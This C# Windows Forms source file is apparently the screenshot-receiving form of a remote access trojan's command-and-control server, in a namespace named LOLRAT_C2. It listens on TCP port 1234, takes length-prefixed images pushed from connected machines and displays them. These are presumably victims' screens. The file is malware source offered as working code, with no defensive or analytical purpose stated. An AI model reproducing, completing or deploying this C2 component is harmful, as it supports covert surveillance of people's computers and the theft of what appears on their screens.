using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace LOLRAT_C2
{
    public partial class SS : Form
    {
        // SS
        private TcpListener serverSS;
        private Image receivedImageSS;

        public SS()
        {
            InitializeComponent();

            // Set PictureBox.SizeMode to Zoom
            pbSS.SizeMode = PictureBoxSizeMode.Zoom;

            // SS stuff
            receivedImageSS = new Bitmap(1, 1);
            pbSS.Image = receivedImageSS;

            // Start listening for connections in a separate thread
            Thread listenerThread = new Thread(ListenForConnectionsSS);
            listenerThread.IsBackground = true;
            listenerThread.Start();
        }

        // Add a method that will be called when the form exits
        private void SS_FormClosing(object sender, FormClosingEventArgs e)
        {
            StopListening();
        }

        // SS
        private void StopListening()
        {
            if (serverSS != null)
            {
                serverSS.Stop();
            }
        }
        private void ListenForConnectionsSS()
        {
            try
            {
                serverSS = new TcpListener(IPAddress.Any, 1234);
                serverSS.Start();
                Console.WriteLine("Waiting for a connection...");

                while (true)
                {
                    using (TcpClient client = serverSS.AcceptTcpClient())
                    {
                        string clientAddress = ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();
                        Console.WriteLine("Accepted connection from " + clientAddress);

                        using (NetworkStream stream = client.GetStream())
                        using (BinaryReader reader = new BinaryReader(stream))
                        {
                            int imageSize = Math.Abs(reader.ReadInt32());
                            if (imageSize > 0)
                            {
                                Console.WriteLine("Receiving image of size: " + imageSize);

                                byte[] imageData = reader.ReadBytes(imageSize);
                                using (MemoryStream memoryStream = new MemoryStream(imageData))
                                {
                                    receivedImageSS = Image.FromStream(memoryStream);
                                }

                                // Display the received image in the PictureBox (Invoke on the main thread)
                                pbSS.Invoke((MethodInvoker)delegate
                                {
                                    pbSS.Invalidate();
                                    pbSS.Image = receivedImageSS;
                                    pbSS.Invalidate();
                                    pbSS.Refresh();
                                });
                            }
                            else
                            {
                                Console.WriteLine("Invalid image size received: " + imageSize);
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }




        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            StopListening();

            base.OnFormClosing(e);
        }

    }
}
